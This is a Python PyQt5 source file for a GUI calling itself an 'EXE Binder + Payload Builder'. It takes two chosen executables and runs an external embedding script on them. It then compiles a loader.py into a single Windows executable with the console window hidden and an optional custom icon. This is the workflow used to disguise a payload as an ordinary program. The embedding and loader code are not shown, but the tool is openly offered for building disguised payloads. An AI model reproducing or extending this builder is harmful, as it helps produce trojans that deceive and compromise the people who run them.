import sys
import os
import subprocess
import shutil
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QHBoxLayout, QPushButton, QFileDialog,
    QLabel, QCheckBox, QGroupBox, QPlainTextEdit, QMessageBox, QFrame
)
from PyQt5.QtGui import QIcon
from PyQt5.QtGui import QFont, QColor, QPalette
from PyQt5.QtCore import Qt
from PyQt5.QtCore import QThread, pyqtSignal

class BuildThread(QThread):
    output_signal = pyqtSignal(str)

    def __init__(self, cmd, output_name, output_dir, payload_name):
        super().__init__()
        self.cmd = cmd
        self.output_name = output_name
        self.output_dir = output_dir
        self.payload_name = payload_name

    def run(self):
        self.output_signal.emit("[*] Building EXE using Nuitka...\n")
        try:
            process = subprocess.Popen(
                self.cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1
            )

            for line in process.stdout:
                self.output_signal.emit(line.rstrip())

            process.wait()

            if process.returncode != 0:
                self.output_signal.emit(f"[!] Build failed with return code {process.returncode}")
                return

            final_path = os.path.join(self.output_dir, self.output_name)
            if os.path.exists(final_path):
                os.remove(final_path)

            os.rename(self.output_name, final_path)

            for suffix in ['.build', '.dist', '.onefile-build']:
                folder = f'{os.path.splitext(self.payload_name)[0]}{suffix}'
                if os.path.exists(folder):
                    shutil.rmtree(folder)

            self.output_signal.emit(f"\n[+] Build completed: {final_path}")
        except Exception as e:
            self.output_signal.emit(f"[!] Exception during build: {str(e)}")


class ExeBuilder(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("🔧 EXE Binder + Payload Builder by Dexedus Eq.")
        self.setGeometry(200, 100, 900, 650)

        self.file1_path = ''
        self.file2_path = ''
        self.icon_path = ''
        self.output_name = 'output.exe'
        self.setWindowIcon(QIcon("icon.ico"))
        self.setStyleSheet("""
            QWidget {
                background-color: #1e1e2f;
                color: #f1f1f1;
                font-family: 'Kanti', sans-serif;
                font-size: 13px;
            }
            QPushButton {
                background-color: #3b3b4f;
                border: 1px solid #5c5c7a;
                border-radius: 4px;
                padding: 6px;
            }
            QPushButton:hover {
                background-color: #4e4e6b;
            }
            QCheckBox {
                padding: 5px;
            }
            QLabel {
                padding: 2px;
            }
        """)

        layout = QVBoxLayout()

        file_group = QGroupBox("📁 Select EXE Files")
        file_layout = QVBoxLayout()

        self.label1 = QLabel("First .exe file not selected")
        self.button1 = QPushButton("Browse FIRST .exe")
        self.button1.clicked.connect(self.select_file1)

        self.label2 = QLabel("Second .exe file not selected")
        self.button2 = QPushButton("Browse SECOND .exe")
        self.button2.clicked.connect(self.select_file2)

        file_layout.addWidget(self.label1)
        file_layout.addWidget(self.button1)
        file_layout.addWidget(self.label2)
        file_layout.addWidget(self.button2)
        file_group.setLayout(file_layout)
        layout.addWidget(file_group)

        icon_group = QGroupBox("🎨 Optional Icon")
        icon_layout = QVBoxLayout()
        self.icon_checkbox = QCheckBox("Include .ico icon")
        self.icon_checkbox.stateChanged.connect(self.toggle_icon)

        self.icon_button = QPushButton("Browse Icon File (.ico)")
        self.icon_button.setEnabled(False)
        self.icon_button.clicked.connect(self.select_icon)

        icon_layout.addWidget(self.icon_checkbox)
        icon_layout.addWidget(self.icon_button)
        icon_group.setLayout(icon_layout)
        layout.addWidget(icon_group)

        button_layout = QHBoxLayout()
        self.embed_button = QPushButton("🔗 Run Embed")
        self.embed_button.clicked.connect(self.run_embed)

        self.build_button = QPushButton("⚙️ Build EXE")
        self.build_button.clicked.connect(self.build_exe)

        button_layout.addWidget(self.embed_button)
        button_layout.addWidget(self.build_button)
        layout.addLayout(button_layout)

        console_label = QLabel("📜 Console Output:")
        layout.addWidget(console_label)

        self.console = QPlainTextEdit()
        self.console.setReadOnly(True)
        self.console.setStyleSheet("""
            QPlainTextEdit {
                background-color: #0d0d15;
                color: #00ff99;
                border: 1px solid #3a3a5a;
                font-family: Consolas;
                font-size: 12px;
            }
        """)
        layout.addWidget(self.console)

        line = QFrame()
        line.setFrameShape(QFrame.HLine)
        line.setFrameShadow(QFrame.Sunken)
        layout.addWidget(line)

        self.setLayout(layout)

    def log(self, message):
        self.console.appendPlainText(message)

    def select_file1(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select FIRST .exe file", "", "Executable Files (*.exe)")
        if path:
            self.file1_path = path
            self.label1.setText(f"✅ First file: {os.path.basename(path)}")

    def select_file2(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select SECOND .exe file", "", "Executable Files (*.exe)")
        if path:
            self.file2_path = path
            self.label2.setText(f"✅ Second file: {os.path.basename(path)}")

    def toggle_icon(self, state):
        self.icon_button.setEnabled(state == Qt.Checked)

    def select_icon(self):
        path, _ = QFileDialog.getOpenFileName(self, "Select .ico file", "", "Icon Files (*.ico)")
        if path:
            self.icon_path = path
            self.icon_button.setText(f"✅ {os.path.basename(path)}")

    def run_embed(self):
        if not self.file1_path or not self.file2_path:
            QMessageBox.warning(self, "Missing Files", "Please select both .exe files.")
            return

        try:
            self.log("[*] Running embed_files.py...")
            python_cmd = 'python' if sys.platform == 'win32' else 'python3'
            result = subprocess.run(
                [python_cmd, 'embed_files.py', self.file1_path, self.file2_path],
                capture_output=True,
                text=True
            )
            self.log(result.stdout)
            if result.stderr:
                self.log("[!] Error: " + result.stderr)
            else:
                self.log("[+] Embed completed successfully.")
        except Exception as e:
            self.log(f"[!] Failed to run embed_files.py: {str(e)}")

    def build_exe(self):
        payload = 'loader.py'
        output_directory = 'Output'

        if not os.path.isfile(payload):
            self.log("[!] Error: loader.py not found.")
            return

        os.makedirs(output_directory, exist_ok=True)

        cmd = [
            sys.executable, '-m', 'nuitka',
            '--onefile',
            '--windows-console-mode=disable',
            f'--output-filename={self.output_name}',
        ]

        if self.icon_checkbox.isChecked() and os.path.isfile(self.icon_path):
            cmd.append(f'--windows-icon-from-ico={self.icon_path}')

        cmd.append(payload)

        self.build_thread = BuildThread(cmd, self.output_name, output_directory, payload)
        self.build_thread.output_signal.connect(self.log)
        self.build_thread.start()

    def clear_build_temp(self, name):
        for suffix in ['.build', '.dist', '.onefile-build']:
            folder = f'{name}{suffix}'
            if os.path.exists(folder):
                shutil.rmtree(folder)


if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = ExeBuilder()
    window.show()
    sys.exit(app.exec_())
